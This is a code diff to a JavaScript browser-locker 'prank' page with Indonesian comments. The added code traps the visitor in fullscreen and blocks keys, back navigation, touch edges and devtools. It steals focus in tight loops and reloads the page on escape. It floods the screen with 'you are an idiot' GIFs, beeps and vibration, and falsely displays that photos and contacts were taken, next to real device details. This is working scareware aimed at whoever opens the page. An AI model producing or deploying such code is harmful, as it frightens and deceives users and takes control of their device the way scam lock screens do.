+        try { history.pushState({ lock: true, t: Date.now() }, null, location.href); } catch(e) {}
+      }
+    }
     window.addEventListener('popstate', function() {
-      if (LOCKED) { history.pushState(null, null, location.href); showEscapeWarning(); }
+      if (LOCKED) {
+        for (var i = 0; i < 5; i++) pushLock();
+        showEscapeWarning();
+        vibrateSafe([500, 100, 500, 100, 500]);
+        try { window.focus(); } catch(e) {}
+      }
     });
+    if (HISTORY_LOCK_INTERVAL) clearInterval(HISTORY_LOCK_INTERVAL);
+    HISTORY_LOCK_INTERVAL = setInterval(pushLock, 100);
+
+    /* ============ 3. BEFOREUNLOAD ============ */
     window.addEventListener('beforeunload', function(e) {
-      if (LOCKED) { e.preventDefault(); e.returnValue = 'DEVICE MASIH TERKUNCI!'; return 'DEVICE MASIH TERKUNCI!'; }
+      if (LOCKED) {
+        e.preventDefault();
+        e.returnValue = 'DEVICE MASIH TERKUNCI!';
+        try { window.focus(); } catch(err) {}
+        return 'DEVICE MASIH TERKUNCI!';
+      }
     });
+
+    /* ============ 4. PAGEHIDE ============ */
+    window.addEventListener('pagehide', function() {
+      if (LOCKED) try { window.focus(); } catch(e) {}
+    });
+
+    /* ============ 5. KEYBOARD BLOCK (selain ESC) ============ */
     document.addEventListener('keydown', function(e) {
       if (!LOCKED) return;
       var key = (e.key || '').toLowerCase();
       var ctrl = e.ctrlKey || e.metaKey;
+      var alt = e.altKey;
+      var shift = e.shiftKey;
       var blocked = false;
-      if (key === 'f5') blocked = true;
-      if (ctrl && key === 'r') blocked = true;
-      if (ctrl && key === 'w') blocked = true;
-      if (key === 'escape') blocked = true;
-      if (e.altKey && key === 'f4') blocked = true;
-      if (ctrl && (key === 't' || key === 'n')) blocked = true;
-      if (key === 'f11') blocked = true;
-      if (key === 'backspace') blocked = true;
-      if (e.altKey && key === 'arrowleft') blocked = true;
-      if (key === 'f12') blocked = true;
-      if (blocked) { e.preventDefault(); e.stopPropagation(); showEscapeWarning(); return false; }
+
+      if (key === 'f5' || key === 'f11' || key === 'f12' || key === 'backspace' || key === 'printscreen') blocked = true;
+      if (ctrl && (key === 'r' || key === 'w' || key === 't' || key === 'n' || key === 'q' || key === 'u' || key === 'p' || key === 's' || key === 'o' || key === 'd' || key === 'h' || key === 'j')) blocked = true;
+      if (ctrl && shift && (key === 'i' || key === 'j' || key === 'c' || key === 'k' || key === 'm' || key === 's' || key === '3' || key === '4' || key === '5')) blocked = true;
+      if (alt && (key === 'f4' || key === 'arrowleft' || key === 'arrowright' || key === 'home')) blocked = true;
+      if (e.metaKey && (key === 'q' || (shift && (key === '3' || key === '4' || key === '5')))) blocked = true;
+
+      if (blocked) {
+        e.preventDefault();
+        e.stopPropagation();
+        if (key === 'f11') {
+          forceFullscreen();
+          setTimeout(function() { if (LOCKED) forceFullscreen(); }, 10);
+          setTimeout(function() { if (LOCKED) forceFullscreen(); }, 50);
+        }
+        showEscapeWarning();
+        return false;
+      }
     }, true);
+
+    /* ============ 6. FULLSCREEN CHANGE TRAP ============ */
+    function onFullscreenExit() {
+      if (!LOCKED) return;
+      FS_ESCAPE_TIME = Date.now();
+      console.log('[FS] Keluar FS — paksa balik!');
+      // Coba panggil dari context event (dianggap user gesture)
+      try {
+        var el = document.documentElement;
+        if (el.requestFullscreen && !isFullscreen()) {
+          el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+        } else if (el.webkitRequestFullscreen && !isFullscreen()) {
+          el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+        }
+      } catch(e) {}
+      // Coba lagi beberapa kali
+      setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 0);
+      setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 20);
+      setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 60);
+      setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 150);
+      setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 300);
+      showEscapeWarning();
+      vibrateSafe([500, 100, 500, 100, 500]);
+      playBeep(300, 0.15, 'sawtooth');
+      try { window.focus(); } catch(e) {}
+    }
+
+    document.addEventListener('fullscreenchange', function() {
+      if (!isFullscreen() && LOCKED) onFullscreenExit();
+    });
+    document.addEventListener('webkitfullscreenchange', function() {
+      if (!isFullscreen() && LOCKED) onFullscreenExit();
+    });
+    document.addEventListener('mozfullscreenchange', function() {
+      if (!isFullscreen() && LOCKED) onFullscreenExit();
+    });
+    document.addEventListener('MSFullscreenChange', function() {
+      if (!isFullscreen() && LOCKED) onFullscreenExit();
+    });
+
+    /* ============ 7. RAF LOOP — CEK FULLSCREEN TIAP FRAME ============ */
+    FS_RAF_RUNNING = true;
+    function fsRafLoop() {
+      if (!FS_RAF_RUNNING || !LOCKED) return;
+      if (!isFullscreen()) {
+        if (!FS_ESCAPE_TIME) FS_ESCAPE_TIME = Date.now();
+        forceFullscreen();
+      } else {
+        FS_ESCAPE_TIME = 0;
+      }
+      requestAnimationFrame(fsRafLoop);
+    }
+    requestAnimationFrame(fsRafLoop);
+
+    /* ============ 8. OVERRIDE EXITFULLSCREEN API ============ */
+    try {
+      var blockExitFullscreen = function() {
+        if (LOCKED) {
+          console.log('[FS] exitFullscreen() diblokir');
+          forceFullscreen();
+          return Promise.reject(new Error('Blocked'));
+        }
+        return Promise.resolve();
+      };
+      if (document.exitFullscreen) document.exitFullscreen = blockExitFullscreen;
+      if (document.webkitExitFullscreen) document.webkitExitFullscreen = blockExitFullscreen;
+      if (document.mozCancelFullScreen) document.mozCancelFullScreen = blockExitFullscreen;
+      if (document.msExitFullscreen) document.msExitFullscreen = blockExitFullscreen;
+    } catch(e) {}
+
+    /* ============ 9. RELOAD WATCHDOG — KALAU KELUAR > 800ms ============ */
+    if (RELOAD_WATCHDOG) clearInterval(RELOAD_WATCHDOG);
+    RELOAD_WATCHDOG = setInterval(function() {
+      if (!LOCKED) { clearInterval(RELOAD_WATCHDOG); return; }
+      if (!isFullscreen()) {
+        if (!FS_ESCAPE_TIME) FS_ESCAPE_TIME = Date.now();
+        if (Date.now() - FS_ESCAPE_TIME > 800) {
+          console.warn('[FS] Keluar > 800ms — RELOAD!');
+          try {
+            sessionStorage.setItem('kompas_locked', '1');
+            sessionStorage.setItem('kompas_attempts', ATTEMPTS);
+          } catch(e) {}
+          location.reload();
+        }
+      } else {
+        FS_ESCAPE_TIME = 0;
+      }
+    }, 200);
+
+    /* ============ 10. CONTEXT MENU ============ */
     document.addEventListener('contextmenu', function(e) {
       if (LOCKED) { e.preventDefault(); showEscapeWarning(); return false; }
     });
+
+    /* ============ 11. COPY/CUT/DRAG ============ */
     document.addEventListener('selectstart', function(e) { if (LOCKED) e.preventDefault(); });
+    document.addEventListener('copy', function(e) { if (LOCKED) { e.preventDefault(); showEscapeWarning(); } });
+    document.addEventListener('cut', function(e) { if (LOCKED) { e.preventDefault(); showEscapeWarning(); } });
+    document.addEventListener('dragstart', function(e) { if (LOCKED) e.preventDefault(); });
+
+    /* ============ 12. VISIBILITY TRAP ============ */
     document.addEventListener('visibilitychange', function() {
-      if (!document.hidden && LOCKED) {
-        forceFullscreen();
-        showEscapeWarning();
-        vibrateSafe([500, 100, 500]);
-        if (IDIOT_AUDIO && IDIOT_PLAYING && IDIOT_AUDIO.paused) IDIOT_AUDIO.play().catch(function(){});
+      if (LOCKED) {
+        if (document.hidden) {
+          BLUR_START_TIME = Date.now();
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 10);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 50);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 100);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 200);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 400);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 700);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 1000);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 1500);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 2000);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 3000);
+          if (BLUR_TIMEOUT) clearTimeout(BLUR_TIMEOUT);
+          BLUR_TIMEOUT = setTimeout(function() {
+            if (LOCKED && document.hidden) applyEscapePenalty();
+          }, 3000);
+        } else {
+          if (BLUR_TIMEOUT) clearTimeout(BLUR_TIMEOUT);
+          forceFullscreen();
+          showEscapeWarning();
+          vibrateSafe([500, 100, 500]);
+          requestWakeLock();
+          if (IDIOT_AUDIO && IDIOT_PLAYING && IDIOT_AUDIO.paused) IDIOT_AUDIO.play().catch(function(){});
+        }
       }
     });
+
+    /* ============ 13. BLUR TRAP ============ */
+    var BLUR_ATTEMPTS = 0;
     window.addEventListener('blur', function() {
       if (LOCKED) {
+        BLUR_ATTEMPTS++;
+        BLUR_START_TIME = Date.now();
         document.title = '⚠ JANGAN KELUAR! ⚠';
         setTimeout(function() { document.title = '⚠ SYSTEM BREACHED'; }, 2000);
         vibrateSafe([800, 100, 800, 100, 800]);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 10);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 30);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 60);
         setTimeout(function() { try { window.focus(); } catch(e) {} }, 100);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 300);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 200);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 400);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 700);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 1000);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 1500);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 2000);
+        if (BLUR_ATTEMPTS >= 2) showEscapeWarning();
+        if (BLUR_TIMEOUT) clearTimeout(BLUR_TIMEOUT);
+        BLUR_TIMEOUT = setTimeout(function() {
+          if (LOCKED) applyEscapePenalty();
+        }, 3000);
       }
     });
+
     window.addEventListener('focus', function() {
       if (LOCKED) {
+        if (BLUR_TIMEOUT) clearTimeout(BLUR_TIMEOUT);
         forceFullscreen();
+        requestWakeLock();
+        lockOrientation();
         if (IDIOT_AUDIO && IDIOT_PLAYING && IDIOT_AUDIO.paused) IDIOT_AUDIO.play().catch(function(){});
       }
     });
+
+    /* ============ 14. PAGESHOW ============ */
     window.addEventListener('pageshow', function() {
       if (LOCKED) {
         showEscapeWarning();
         forceFullscreen();
+        requestWakeLock();
+        lockOrientation();
         if (IDIOT_AUDIO && IDIOT_PLAYING && IDIOT_AUDIO.paused) IDIOT_AUDIO.play().catch(function(){});
       }
     });
-    setInterval(function() {
+
+    /* ============ 15. FULLSCREEN WATCHDOG ============ */
+    if (FULLSCREEN_WATCHDOG) clearInterval(FULLSCREEN_WATCHDOG);
+    FULLSCREEN_WATCHDOG = setInterval(function() {
       if (!LOCKED) return;
-      var isFs = document.fullscreenElement || document.webkitFullscreenElement;
-      if (!isFs) { forceFullscreen(); showEscapeWarning(); }
-    }, 400);
-    setInterval(function() {
+      if (!isFullscreen()) {
+        forceFullscreen();
+        if (Date.now() - lastEscapeWarnTime > 1500) showEscapeWarning();
+      }
+    }, 30);
+
+    /* ============ 16. FOCUS WATCHDOG ============ */
+    if (FOCUS_WATCHDOG) clearInterval(FOCUS_WATCHDOG);
+    FOCUS_WATCHDOG = setInterval(function() {
       if (!LOCKED) return;
       try { window.focus(); } catch(e) {}
+    }, 10);
+
+    /* ============ 17. VISIBILITY WATCHDOG ============ */
+    if (VISIBILITY_WATCHDOG) clearInterval(VISIBILITY_WATCHDOG);
+    VISIBILITY_WATCHDOG = setInterval(function() {
+      if (!LOCKED) return;
+      if (document.hidden) {
+        try { window.focus(); } catch(e) {}
+        if (BLUR_START_TIME && (Date.now() - BLUR_START_TIME > 3000) && !ESCAPE_PENALTY_ACTIVE) {
+          applyEscapePenalty();
+        }
+      } else {
+        BLUR_START_TIME = 0;
+      }
     }, 100);
-    document.addEventListener('dragstart', function(e) { if (LOCKED) e.preventDefault(); });
-    document.addEventListener('touchmove', function(e) {
-      if (LOCKED && e.touches.length > 1) e.preventDefault();
-    }, { passive: false });
-    var touchStartX = 0, touchStartY = 0;
+
+    /* ============ 18. ORIENTATION WATCHDOG ============ */
+    if (ORIENTATION_WATCHDOG) clearInterval(ORIENTATION_WATCHDOG);
+    ORIENTATION_WATCHDOG = setInterval(function() {
+      if (!LOCKED) return;
+      lockOrientation();
+    }, 500);
+
+    /* ============ 19. WAKE LOCK ============ */
+    var WAKE_LOCK_INTERVAL = setInterval(function() {
+      if (!LOCKED) { clearInterval(WAKE_LOCK_INTERVAL); return; }
+      if (!WAKE_LOCK || WAKE_LOCK.released) requestWakeLock();
+    }, 2000);
+
+    /* ============ 20. TOUCH EDGE BLOCK ============ */
+    var touchStartX = 0, touchStartY = 0, touchStartTime = 0;
+    var EDGE_SIZE = 70;
+
     document.addEventListener('touchstart', function(e) {
       if (!LOCKED) return;
       if (e.touches.length === 1) {
         touchStartX = e.touches[0].clientX;
         touchStartY = e.touches[0].clientY;
-        if (touchStartX < 25) { e.preventDefault(); showEscapeWarning(); }
+        touchStartTime = Date.now();
+        if (touchStartX < EDGE_SIZE || touchStartX > window.innerWidth - EDGE_SIZE ||
+            touchStartY < EDGE_SIZE || touchStartY > window.innerHeight - EDGE_SIZE) {
+          e.preventDefault();
+        }
+      } else if (e.touches.length > 1) {
+        e.preventDefault();
       }
     }, { passive: false });
-    document.addEventListener('touchend', function(e) {
+
+    document.addEventListener('touchmove', function(e) {
       if (!LOCKED) return;
-      if (!e.changedTouches.length) return;
+      if (e.touches.length > 1) { e.preventDefault(); return; }
+      if (e.touches.length === 1) {
+        var x = e.touches[0].clientX;
+        var y = e.touches[0].clientY;
+        if (x < EDGE_SIZE || x > window.innerWidth - EDGE_SIZE) e.preventDefault();
+        if (y < EDGE_SIZE && window.scrollY <= 0) e.preventDefault();
+        if (y > window.innerHeight - EDGE_SIZE) e.preventDefault();
+      }
+    }, { passive: false });
+
+    document.addEventListener('touchend', function(e) {
+      if (!LOCKED || !e.changedTouches.length) return;
       var endX = e.changedTouches[0].clientX;
       var endY = e.changedTouches[0].clientY;
       var dx = endX - touchStartX;
       var dy = endY - touchStartY;
-      if (Math.abs(dx) > 60 && Math.abs(dy) < 80) {
-        if (touchStartX < 30 || touchStartX > window.innerWidth - 30) {
-          e.preventDefault();
-          showEscapeWarning();
+      var dt = Date.now() - touchStartTime;
+      if (Math.abs(dx) > 30 && Math.abs(dy) < 100 && dt < 500) {
+        if (touchStartX < EDGE_SIZE || touchStartX > window.innerWidth - EDGE_SIZE) {
+          e.preventDefault(); showEscapeWarning(); vibrateSafe([400, 100, 400]);
+        }
+      }
+      if (dy > 50 && Math.abs(dx) < 60 && dt < 500) {
+        if (touchStartY < EDGE_SIZE) {
+          e.preventDefault(); showEscapeWarning(); vibrateSafe([400, 100, 400]);
+        }
+      }
+      if (dy < -50 && Math.abs(dx) < 60 && dt < 500) {
+        if (touchStartY > window.innerHeight - EDGE_SIZE) {
+          e.preventDefault(); showEscapeWarning(); vibrateSafe([400, 100, 400]);
         }
       }
     }, { passive: false });
+
+    /* ============ 21. PULL-TO-REFRESH ============ */
+    var pullStartY = 0;
+    document.addEventListener('touchstart', function(e) {
+      if (!LOCKED) return;
+      if (e.touches.length === 1) pullStartY = e.touches[0].clientY;
+    }, { passive: true });
+    document.addEventListener('touchmove', function(e) {
+      if (!LOCKED || e.touches.length !== 1) return;
+      var y = e.touches[0].clientY;
+      if (window.scrollY <= 0 && y > pullStartY && (y - pullStartY) > 20) e.preventDefault();
+    }, { passive: false });
+
+    /* ============ 22. WHEEL ============ */
+    document.addEventListener('wheel', function(e) {
+      if (LOCKED) e.preventDefault();
+    }, { passive: false });
+
+    /* ============ 23. GESTURE iOS ============ */
+    document.addEventListener('gesturestart', function(e) { if (LOCKED) e.preventDefault(); });
+    document.addEventListener('gesturechange', function(e) { if (LOCKED) e.preventDefault(); });
+    document.addEventListener('gestureend', function(e) { if (LOCKED) e.preventDefault(); });
+
+    /* ============ 24. DOUBLE-TAP ============ */
+    var lastTouchEnd = 0;
+    document.addEventListener('touchend', function(e) {
+      if (!LOCKED) return;
+      var now = Date.now();
+      if (now - lastTouchEnd <= 300) e.preventDefault();
+      lastTouchEnd = now;
+    }, { passive: false });
+
+    /* ============ 25. DEVTOOLS DETECTION ============ */
+    var DEVTOOLS_CHECK = setInterval(function() {
+      if (!LOCKED) { clearInterval(DEVTOOLS_CHECK); return; }
+      var threshold = 160;
+      var wDiff = window.outerWidth - window.innerWidth > threshold;
+      var hDiff = window.outerHeight - window.innerHeight > threshold;
+      if (wDiff || hDiff) {
+        showEscapeWarning();
+        vibrateSafe([500, 100, 500]);
+      }
+    }, 2000);
+
+    /* ============ 26. MOUSE LEAVE ============ */
+    document.addEventListener('mouseleave', function(e) {
+      if (LOCKED) setTimeout(function() { try { window.focus(); } catch(err) {} }, 50);
+    });
+
+    /* ============ 27. ORIENTATION CHANGE ============ */
+    window.addEventListener('orientationchange', function() {
+      if (LOCKED) {
+        setTimeout(function() {
+          forceFullscreen();
+          lockOrientation();
+        }, 100);
+      }
+    });
+  }
+
+  /* ============ GIF ATTACK SYSTEM ============ */
+  var GIF_SRC = 'youareanidiot.gif';
+  var GIF_ITEMS = [];
+  var GIF_TIMERS = [];
+  var GIF_MAX = 40;
+
+  function getGifConfig(attempt) {
+    var counts = [3, 6, 12, 20, 30];
+    var count = counts[Math.min(attempt - 1, counts.length - 1)];
+    if (attempt > 5) count = 30 + (attempt - 5) * 10;
+    var duration = 10000 + (attempt - 1) * 5000;
+    var level = 1;
+    if (attempt >= 3) level = 2;
+    if (attempt >= 4) level = 3;
+    if (attempt >= 6) level = 4;
+    var sizeRange = {
+      1: [400, 700], 2: [500, 900], 3: [600, 1100], 4: [700, 1400]
+    }[level] || [400, 700];
+    return {
+      count: Math.min(count, GIF_MAX),
+      duration: duration, level: level,
+      sizeMin: sizeRange[0], sizeMax: sizeRange[1],
+      spawnInterval: Math.max(80, 500 - attempt * 60),
+      hasShake: level >= 2, hasSpin: level >= 3, hasBounce: level >= 4
+    };
+  }
+
+  function spawnGif(level, sizeMin, sizeMax, options) {
+    options = options || {};
+    var layer = document.getElementById('gifAttackLayer');
+    if (!layer) return null;
+    if (GIF_ITEMS.length >= GIF_MAX) {
+      var oldest = GIF_ITEMS.shift();
+      if (oldest && oldest.parentNode) oldest.parentNode.removeChild(oldest);
+    }
+    var wrapper = document.createElement('div');
+    wrapper.className = 'gif-wrapper';
+    var img = document.createElement('img');
+    img.src = GIF_SRC;
+    img.className = 'gif-attack-item';
+    if (level === 2) img.classList.add('aggressive');
+    if (level === 3) img.classList.add('aggressive', 'chaos');
+    if (level >= 4) img.classList.add('chaos');
+    if (options.spin) img.classList.add('spinning');
+    if (options.bounce) img.classList.add('bouncing');
+    var maxW = window.innerWidth, maxH = window.innerHeight;
+    var size = sizeMin + Math.random() * (sizeMax - sizeMin);
+    size = Math.floor(size);
+    var finalSize = Math.min(size, Math.max(maxW, maxH) * 1.5);
+    img.style.width = finalSize + 'px';
+    img.style.height = 'auto';
+    img.style.display = 'block';
+    var maxX = Math.max(10, maxW - finalSize * 0.5);
+    var maxY = Math.max(10, maxH - finalSize * 0.5);
+    var x = Math.random() * maxX - finalSize * 0.25;
+    var y = Math.random() * maxY - finalSize * 0.25;
+    wrapper.style.left = x + 'px';
+    wrapper.style.top = y + 'px';
+    if (level >= 3) {
+      var rot = (Math.random() - 0.5) * 60;
+      wrapper.style.transform = 'rotate(' + rot + 'deg)';
+    }
+    var closeBtn = document.createElement('button');
+    closeBtn.className = 'gif-close-btn';
+    closeBtn.innerHTML = '✕';
+    closeBtn.type = 'button';
+    closeBtn.addEventListener('click', function(e) {
+      e.preventDefault(); e.stopPropagation();
+      wrapper.style.transition = 'opacity 0.3s, transform 0.3s';
+      wrapper.style.opacity = '0';
+      wrapper.style.transform += ' scale(0.3) rotate(90deg)';
+      playBeep(220, 0.05, 'square', 0.1);
+      setTimeout(function() {
+        if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
+        var i = GIF_ITEMS.indexOf(wrapper);
+        if (i > -1) GIF_ITEMS.splice(i, 1);
+        var respawnDelay = 1500 + Math.random() * 1500;
+        var respawn = setTimeout(function() {
+          if (!LOCKED) return;
+          spawnGif(level, sizeMin, sizeMax, options);
+        }, respawnDelay);
+        GIF_TIMERS.push(respawn);
+      }, 300);
+    });
+    wrapper.appendChild(img);
+    wrapper.appendChild(closeBtn);
+    img.onerror = function() {
+      if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
+      var i = GIF_ITEMS.indexOf(wrapper);
+      if (i > -1) GIF_ITEMS.splice(i, 1);
+    };
+    layer.appendChild(wrapper);
+    GIF_ITEMS.push(wrapper);
+    var lifetime = (options.duration || 10000) + Math.random() * 3000;
+    var tm = setTimeout(function() {
+      if (wrapper.parentNode) {
+        wrapper.style.transition = 'opacity 0.4s, transform 0.4s';
+        wrapper.style.opacity = '0';
+        wrapper.style.transform += ' scale(0.3) rotate(45deg)';
+        setTimeout(function() {
+          if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
+          var i = GIF_ITEMS.indexOf(wrapper);
+          if (i > -1) GIF_ITEMS.splice(i, 1);
+        }, 400);
+      }
+    }, lifetime);
+    GIF_TIMERS.push(tm);
+    return wrapper;
+  }
+
+  function triggerGifAttack(attempt) {
+    stopGifAttack();
+    var cfg = getGifConfig(attempt);
+    showGifCounter(cfg.count);
+    updateIdiotVolume(attempt);
+    var burstSpeed = cfg.level >= 3 ? 60 : cfg.level >= 2 ? 120 : 180;
+    for (var i = 0; i < Math.min(cfg.count, 8); i++) {
+      (function(idx) {
+        var tm = setTimeout(function() {
+          if (!LOCKED) return;
+          spawnGif(cfg.level, cfg.sizeMin, cfg.sizeMax, {
+            duration: cfg.duration,
+            spin: cfg.hasSpin && Math.random() > 0.6,
+            bounce: cfg.hasBounce && Math.random() > 0.5
+          });
+          if (idx % 2 === 0) playBeep(300 + Math.random() * 400, 0.05, 'square', 0.1);
+          vibrateSafe([20]);
+        }, idx * burstSpeed);
+        GIF_TIMERS.push(tm);
+      })(i);
+    }
+    var startTime = Date.now();
+    var stormIv = setInterval(function() {
+      if (!LOCKED || Date.now() - startTime >= cfg.duration) { clearInterval(stormIv); return; }
+      if (GIF_ITEMS.length >= cfg.count) return;
+      var batchSize = cfg.level >= 4 ? 2 : 1;
+      for (var j = 0; j < batchSize; j++) {
+        if (GIF_ITEMS.length >= cfg.count) break;
+        spawnGif(cfg.level, cfg.sizeMin, cfg.sizeMax, {
+          duration: cfg.duration - (Date.now() - startTime),
+          spin: cfg.hasSpin && Math.random() > 0.7,
+          bounce: cfg.hasBounce && Math.random() > 0.6
+        });
+      }
+      if (Math.random() > 0.6) playBeep(200 + Math.random() * 600, 0.04, 'square', 0.08);
+    }, cfg.spawnInterval);
+    GIF_TIMERS.push(stormIv);
+    if (cfg.hasShake) document.body.classList.add('mega-shake');
+    var cleanupTm = setTimeout(function() {
+      stopGifAttack();
+      if (LOCKED) startAmbientGif();
+    }, cfg.duration + 2000);
+    GIF_TIMERS.push(cleanupTm);
+  }
+
+  function showGifCounter(count) {
+    var el = document.getElementById('gifCounter');
+    if (!el) return;
+    el.textContent = count;
+    el.classList.remove('show');
+    void el.offsetWidth;
+    el.classList.add('show');
+    setTimeout(function() { el.classList.remove('show'); }, 1500);
+  }
+
+  function stopGifAttack() {
+    GIF_TIMERS.forEach(function(t) { clearTimeout(t); clearInterval(t); });
+    GIF_TIMERS = [];
+    GIF_ITEMS.forEach(function(wrapper) {
+      if (wrapper.parentNode) {
+        wrapper.style.transition = 'opacity 0.5s, transform 0.5s';
+        wrapper.style.opacity = '0';
+        wrapper.style.transform += ' scale(0.2) rotate(180deg)';
+      }
+    });
+    var itemsToRemove = GIF_ITEMS.slice();
+    GIF_ITEMS = [];
+    setTimeout(function() {
+      itemsToRemove.forEach(function(wrapper) {
+        if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
+      });
+    }, 500);
+    document.body.classList.remove('mega-shake');
+  }
+
+  function stopAllGifChaos() {
+    stopAmbientGif();
+    GIF_TIMERS.forEach(function(t) { clearTimeout(t); clearInterval(t); });
+    GIF_TIMERS = [];
+    GIF_ITEMS.forEach(function(wrapper) {
+      if (wrapper.parentNode) wrapper.parentNode.removeChild(wrapper);
+    });
+    GIF_ITEMS = [];
+    document.body.classList.remove('mega-shake');
+    var counter = document.getElementById('gifCounter');
+    if (counter) counter.classList.remove('show');
+  }
+
+  var AMBIENT_ACTIVE = false;
+  var AMBIENT_INTERVAL = null;
+  var AMBIENT_COUNT = 2;
+
+  function startAmbientGif() {
+    if (AMBIENT_ACTIVE) return;
+    AMBIENT_ACTIVE = true;
+    if (!IDIOT_PLAYING) playYouAreAnIdiot(0.15);
+    for (var i = 0; i < AMBIENT_COUNT; i++) {
+      (function(idx) {
+        var tm = setTimeout(function() {
+          if (!LOCKED) return;
+          spawnGif(1, 400, 700, { duration: 999999999, spin: false, bounce: false });
+        }, idx * 400);
+        GIF_TIMERS.push(tm);
+      })(i);
+    }
+    if (AMBIENT_INTERVAL) clearInterval(AMBIENT_INTERVAL);
+    AMBIENT_INTERVAL = setInterval(function() {
+      if (!LOCKED) { clearInterval(AMBIENT_INTERVAL); AMBIENT_INTERVAL = null; return; }
+      if (GIF_ITEMS.length < 1) {
+        spawnGif(1, 400, 700, { duration: 999999999, spin: false, bounce: false });
+      }
+    }, 4000);
+  }
+
+  function stopAmbientGif() {
+    AMBIENT_ACTIVE = false;
+    if (AMBIENT_INTERVAL) { clearInterval(AMBIENT_INTERVAL); AMBIENT_INTERVAL = null; }
   }
 
   /* ============ JUMPSCARE ============ */
@@ -1183,7 +2106,7 @@
     }, JUMPSCARE_DURATION);
   }
 
-  /* ============ MATRIX RAIN ============ */
+  /* ============ MATRIX ============ */
   function initMatrix() {
     var canvas = document.getElementById('matrix');
     var ctx = canvas.getContext('2d');
@@ -1216,7 +2139,7 @@
     });
   }
 
-  /* ============ BINARY RAIN ============ */
+  /* ============ BINARY ============ */
   function initBinary() {
     var canvas = document.getElementById('binary');
     if (!canvas) return;
@@ -1371,7 +2294,7 @@
       });
   }
 
-  /* ============ EMAIL SCRAMBLE ============ */
+  /* ============ SCRAMBLE ============ */
   var SCRAMBLE_CHARS = '!@#$%^&*()<>?/\\{}[]~`01アイウエオabcdefghijklmnop0123456789';
   function scrambleText(element, finalText, duration) {
     if (!element) return;
@@ -1410,42 +2333,17 @@
     return first + sep + last + num + '@' + domain;
   }
 
-  function generateRandomPhone() {
-    var p1 = '8' + (Math.floor(Math.random() * 3) + 1);
-    var p2 = Math.floor(Math.random() * 90 + 10);
-    var p3 = Math.floor(Math.random() * 9000 + 1000);
-    var p4 = Math.floor(Math.random() * 9000 + 1000);
-    return '+62 ' + p1 + p2 + '-' + p3 + '-' + p4;
-  }
-
-  function detectIncognito(cb) {
-    try {
-      if (navigator.storage && navigator.storage.estimate) {
-        navigator.storage.estimate().then(function(est) {
-          var q = (est.quota || 0) / (1024 * 1024);
-          cb({ isPrivate: q < 500 && q > 0 });
-        }).catch(function(){ cb({ isPrivate: false }); });
-      } else cb({ isPrivate: false });
-    } catch(e) { cb({ isPrivate: false }); }
-  }
-
   function detectPersonalData() {
     var emailEl = document.getElementById('pEmail');
     if (emailEl) scrambleText(emailEl, generateRandomEmail(), 2500);
-
-    var phoneEl = document.getElementById('pPhone');
-    if (phoneEl) setTimeout(function() { scrambleText(phoneEl, generateRandomPhone(), 2000); }, 500);
-
     var photosEl = document.getElementById('pPhotos');
     if (photosEl) setTimeout(function() {
       photosEl.textContent = (Math.floor(Math.random() * 800) + 200) + ' file diambil';
     }, 3000);
-
     var contactsEl = document.getElementById('pContacts');
     if (contactsEl) setTimeout(function() {
       contactsEl.textContent = (Math.floor(Math.random() * 300) + 50) + ' kontak diambil';
     }, 3500);
-
     var batteryEl = document.getElementById('pBattery');
     if (batteryEl) {
       if (navigator.getBattery) {
@@ -1460,7 +2358,6 @@
         }).catch(function(){ batteryEl.textContent = 'Hidden'; });
       } else batteryEl.textContent = 'Hidden';
     }
-
     var tzEl = document.getElementById('pTimezone');
     if (tzEl) {
       try {
@@ -1469,7 +2366,6 @@
         tzEl.textContent = tz + ' UTC' + (off >= 0 ? '+' : '') + off;
       } catch(e) { tzEl.textContent = 'Unknown'; }
     }
-
     var gpuEl = document.getElementById('pGpu');
     if (gpuEl) {
       try {
@@ -1515,8 +2411,6 @@
   var CAUGHT = false;
   var DODGE_RADIUS = 80;
   var lastDodgeTime = 0;
-
-  var TAUNTS = ['😏 kabur...','🏃 hehe kena...','😜 coba lagi!','💨 wusss...','😂 hampir!','😝 nope!','🎯 meleset~','🤪 terlalu lambat!','⚡ cepetan dong~','😆 wekekeke'];
 
   function initDodgeButton() {
     btn = document.getElementById('unlockBtn');
@@ -1684,7 +2578,18 @@
       if (COUNTDOWN_INTERVAL) clearInterval(COUNTDOWN_INTERVAL);
       stopTorch();
       stopVibrate();
+      stopAllGifChaos();
       LOCKED = false;
+      FS_RAF_RUNNING = false;
+      try { sessionStorage.removeItem('kompas_locked'); sessionStorage.removeItem('kompas_attempts'); } catch(e) {}
+      if (FULLSCREEN_WATCHDOG) clearInterval(FULLSCREEN_WATCHDOG);
+      if (FOCUS_WATCHDOG) clearInterval(FOCUS_WATCHDOG);
+      if (HISTORY_LOCK_INTERVAL) clearInterval(HISTORY_LOCK_INTERVAL);
